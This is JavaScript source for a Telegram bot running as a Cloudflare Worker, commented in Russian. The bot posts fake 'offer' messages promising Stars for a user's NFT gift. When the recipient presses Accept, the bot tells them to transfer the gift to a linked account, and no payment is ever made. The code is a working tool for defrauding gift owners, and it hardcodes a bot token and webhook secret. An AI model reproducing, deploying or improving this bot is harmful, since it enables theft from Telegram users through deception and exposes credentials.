const ADMIN_ID = 5151757168; 
const BOT_TOKEN = "9231998177:AAGBygPUUaRla7FJujix4bE9cpYWcg4U3w0"; // ВСТАВЬ СВОЙ ТОКЕН
const WEBHOOK_SECRET = "GarisOffer9231998"; // ВСТАВЬ СВОЙ СЕКРЕТ

const ALLOWED_IDS = [5151757168];
const ALLOWED_USERNAMES = ["nogannopervi"];

export default {
  async fetch(request, env, ctx) {
    const secretHeader = request.headers.get("X-Telegram-Bot-Api-Secret-Token");
    if (secretHeader !== WEBHOOK_SECRET) {
      return new Response("Forbidden", { status: 403 });
    }

    if (request.method !== "POST") return new Response("OK", { status: 200 });

    try {
      const update = await request.json();

      // --- /start ---
      if (update.message && update.message.text === "/start") {
        const chatId = update.message.chat.id;
        const userId = update.message.from.id;
        const username = update.message.from.username ? update.message.from.username.toLowerCase() : "";

        const isAdmin = userId === ADMIN_ID;
        const isAllowed = ALLOWED_IDS.includes(userId) || (username && ALLOWED_USERNAMES.includes(username));
        
        let text = "";
        if (!isAdmin && !isAllowed) {
          text = `🔒 <b>Доступ закрыт.</b>\n\nОбратитесь к владельцу.\nВаш ID: <code>${userId}</code>`;
        } else {
          // ТУТ ОБНОВЛЕННЫЙ ТЕКСТ С ТВОИМ ПРИМЕРОМ
          text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Пользователь · Gift</b>\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\nЧтобы отправить оффер, напишите:\n<code>@GarisOfferBot t.me/nft/LolPop-348029 450 stars</code>`;
        }
        await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" });
      }

      // --- INLINE (Создание офера) ---
      if (update.inline_query) {
        const iq = update.inline_query;
        const userId = iq.from.id;
        const username = iq.from.username ? iq.from.username.toLowerCase() : "";
        
        const isAdmin = userId === ADMIN_ID;
        const isAllowed = ALLOWED_IDS.includes(userId) || (username && ALLOWED_USERNAMES.includes(username));

        if (!isAdmin && !isAllowed) return new Response("OK", { status: 200 });

        const textQuery = iq.query.trim();
        
        // Ищем все числа и берем последнее (это сумма)
        const allNums = textQuery.match(/\d+/g); 
        const amount = allNums ? allNums[allNums.length - 1] : "0"; 
        
        // Ищем название подарка
        const giftMatch = textQuery.match(/(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/); 
        const giftId = giftMatch ? giftMatch[0] : "";
        
        // Формируем правильную ссылку для красивой картинки
        let giftLink = "";
        if (giftId) {
            if (giftId.startsWith("t.me")) {
                giftLink = "https://" + giftId;
            } else {
                giftLink = "https://t.me/nft/" + giftId;
            }
        }

        let senderName = iq.from.first_name || "";
        if (iq.from.last_name) senderName += " " + iq.from.last_name;
        if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";

        const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ⭐ Stars за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;

        const results = [{
          type: "article",
          id: "1",
          title: `Оффер от ${senderName}`,
          description: `За ${amount} ⭐ Stars`,
          input_message_content: { message_text: text, parse_mode: "HTML" },
          reply_markup: {
            inline_keyboard: [
              [{ text: "✅ Принять", callback_data: "acc" }],
              [{ text: "❌ Отклонить", callback_data: "dec" }]
            ]
          }
        }];

        await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 });
      }

      // --- КНОПКИ ---
      if (update.callback_query) {
        const cq = update.callback_query;
        
        // 1. СНАЧАЛА МГНОВЕННО ОТВЕЧАЕМ TELEGRAM (убираем загрузку)
        try {
          if (cq.data.startsWith("acc")) {
            await callApi("answerCallbackQuery", { 
              callback_query_id: cq.id, 
              text: `Market\nПредложение на продажу успешно принято.`, 
              show_alert: true 
            });
          } else if (cq.data.startsWith("dec")) {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id });
          } else {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id });
          }
        } catch (e) {
          console.error("Ошибка при ответе на кнопку:", e);
        }

        // 2. ТЕПЕРЬ МЕНЯЕМ СООБЩЕНИЕ
        try {
          if (!cq.message) return new Response("OK", { status: 200 });
          
          const chatId = cq.message.chat.id;
          const messageId = cq.message.message_id;
          const hasCaption = !!cq.message.caption;
          const messageText = cq.message.text || cq.message.caption || "";

          const amountMatch = messageText.match(/(\d+)\s*⭐/);
          const amount = amountMatch ? amountMatch[1] : "указанную сумму";

          if (cq.data.startsWith("acc")) {
            const newText = `✓ <b>Предложение успешно принято.</b>\n\nПередайте подарок покупателю, чтобы получить ${amount} ⭐.`;
            const newMarkup = { 
              inline_keyboard: [[{ text: "Передать NFT ↗", url: "https://t.me/gwrex" }]] 
            };

            if (hasCaption) {
              await callApi("editMessageCaption", { chat_id: chatId, message_id: messageId, caption: newText, parse_mode: "HTML", reply_markup: newMarkup });
            } else {
              await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: newMarkup });
            }
          } 
          else if (cq.data.startsWith("dec")) {
            const newText = `× Оффер отклонён.`;
            const emptyMarkup = { inline_keyboard: [] };

            if (hasCaption) {
              await callApi("editMessageCaption", { chat_id: chatId, message_id: messageId, caption: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
            } else {
              await callApi("editMessageText", { chat_id: chatId, message_id: messageId, text: newText, parse_mode: "HTML", reply_markup: emptyMarkup });
            }
          }
        } catch (e) {
          console.error("Ошибка при изменении сообщения:", e);
        }
      }

      return new Response("OK", { status: 200 });
    } catch (error) {
      console.error("КРИТИЧЕСКАЯ ОШИБКА:", error.message);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};

async function callApi(method, body) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body)
    });
    return await response.json();
  } catch (e) {
    console.error("Ошибка Fetch:", e.message);
    throw e;
  }
}